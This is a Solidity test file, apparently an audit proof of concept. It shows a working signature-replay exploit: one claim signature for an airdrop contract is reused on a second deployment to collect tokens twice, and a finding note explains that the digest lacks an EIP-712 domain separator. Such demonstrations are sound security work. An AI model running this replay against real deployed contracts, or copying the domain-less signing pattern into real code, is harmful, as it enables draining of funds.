// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/501-SignatureAirdrop.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MCK") {
        _mint(msg.sender, 1_000_000e18);
    }
}

contract AirdropDistributorTest is Test {

    AirdropDistributor mainnet;
    AirdropDistributor base;
    MockERC20 token;

    address owner;
    address alice;
    uint256 signerPk;
    address signerAddr;

    bytes32 constant CLAIM_TYPEHASH = keccak256(
        "Claim(address recipient,uint256 amount)"
    );

    function setUp() public {
        owner = makeAddr("owner");
        alice = makeAddr("alice");
        (signerAddr, signerPk) = makeAddrAndKey("signer");

        vm.startPrank(owner);
        token = new MockERC20();

        // same contract deployed on two chains (simulated by two instances)
        mainnet = new AirdropDistributor(address(token), signerAddr);
        base = new AirdropDistributor(address(token), signerAddr);

        // fund both contracts
        token.transfer(address(mainnet), 10_000e18);
        token.transfer(address(base), 10_000e18);
        vm.stopPrank();
    }

    function testCrossContractSignatureReplay() public {
        uint256 amount = 500e18;

        // signer signs a claim for alice — intended for mainnet only
        bytes32 structHash = keccak256(abi.encode(CLAIM_TYPEHASH, alice, amount));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        // alice claims on mainnet legitimately
        vm.prank(alice);
        mainnet.claim(amount, signature);
        assertEq(token.balanceOf(alice), amount);
        console.log("claimed on mainnet:", token.balanceOf(alice));

        // alice replays the exact same signature on base deployment
        vm.prank(alice);
        base.claim(amount, signature);
        assertEq(token.balanceOf(alice), amount * 2);
        console.log("claimed on base (replay):", token.balanceOf(alice));
    }

    /* Finding:
    Missing domain separator enables cross-contract signature replay
    Severity: High
    Location: AirdropDistributor.sol → claim()
    Description: The digest is built using \x19\x01 prefix directly against the struct hash,
    omitting a proper EIP712 domain separator. No chainId or verifyingContract is bound to the
    signature, meaning a valid signature on one deployment is equally valid on any other deployment 
    of the same contract across all chains.

    Impact: A recipient who receives a legitimate signature can replay it against every other 
    deployment of AirdropDistributor that uses the same signer, claiming the full allocation 
    multiple times across chains and draining every funded instance.
    */
}